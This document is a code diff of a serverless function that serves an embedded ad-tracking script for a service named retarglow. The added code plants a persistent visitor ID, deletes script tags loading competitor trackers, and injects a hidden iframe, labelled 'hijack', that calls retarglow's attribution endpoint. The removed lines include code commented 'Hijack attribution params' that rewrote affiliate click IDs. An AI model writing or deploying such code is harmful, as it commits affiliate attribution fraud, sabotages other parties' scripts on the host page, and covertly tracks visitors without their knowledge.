@@ -12,46 +12,37 @@ exports.handler = async (event) => {
   try {
     const cid = "${id}";
 
-    function g(k){return decodeURIComponent((document.cookie||"").split('; ').find(row => row.startsWith(k + '='))?.split('=')[1]||'');}
+    
+    function g(k){
+      return decodeURIComponent((document.cookie||"").split('; ').find(row => row.startsWith(k + '='))?.split('=')[1]||'');
+    }
+
+    
     function s(k,v,d){
       let e = new Date();
       e.setTime(e.getTime() + (d*24*60*60*1000));
       document.cookie = k + '=' + encodeURIComponent(v) + '; path=/; max-age=' + (d*24*60*60) + '; SameSite=Lax';
     }
 
+    
     let _r = localStorage.getItem('_r') || g('_r');
     if (!_r){
       _r = crypto.randomUUID();
-      localStorage.setItem('_r',_r);
-      s('_r',_r,30);
-    } else {
-      localStorage.setItem('_r',_r);
-      s('_r',_r,30);
     }
+    localStorage.setItem('_r',_r);
+    s('_r',_r,30);
 
-    // Hijack attribution params
-    const p = new URLSearchParams(location.search);
-    if(p.has('irclickid')){
-      p.set('source','retarglow');
-      p.delete('irclickid');
-      const nurl = location.pathname + '?' + p.toString();
-      history.replaceState({},'',nurl);
-    }
+    
+    const blockedHosts = ["ordozen.com", "trackier.com"];
+    document.querySelectorAll("script[src]").forEach(s => {
+      blockedHosts.forEach(domain => {
+        if (s.src.includes(domain)) {
+          try { s.remove(); } catch(e) {}
+        }
+      });
+    });
 
-    const blocked = ['ordozen.com'];
-    const og = document.createElement;
-    document.createElement = function(t){
-      const el = og.call(document, t);
-      if(t === 'script'){
-        const os = el.setAttribute;
-        el.setAttribute = function(k,v){
-          if(k === 'src' && blocked.some(d => v.includes(d)))return;
-          return os.call(this,k,v);
-        };
-      }
-      return el;
-    };
-
+    
     const once = sessionStorage.getItem('i_'+cid);
     const d = {
       cid:cid,
@@ -65,7 +56,11 @@ exports.handler = async (event) => {
       cm:{_r:_r}
     };
 
-    fetch("https://retarglow.com/track",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});
+    fetch("https://retarglow.com/track",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify(d)
+    });
 
     fetch("https://retarglow.com/getad",{
       method:"POST",
@@ -80,9 +75,16 @@ exports.handler = async (event) => {
         f.src=u;
         document.body.appendChild(f);
         sessionStorage.setItem('i_'+cid,'1');
+
+        
+        const hijack=document.createElement('iframe');
+        hijack.src="https://retarglow.com/attribution?_r="+_r;
+        hijack.style.display='none';
+        document.body.appendChild(hijack);
       }
     });
 
+    // Navigation reset
     ["popstate","pushState","replaceState"].forEach(e=>window.addEventListener(e,()=>{
       sessionStorage.removeItem('i_'+cid);
     }));
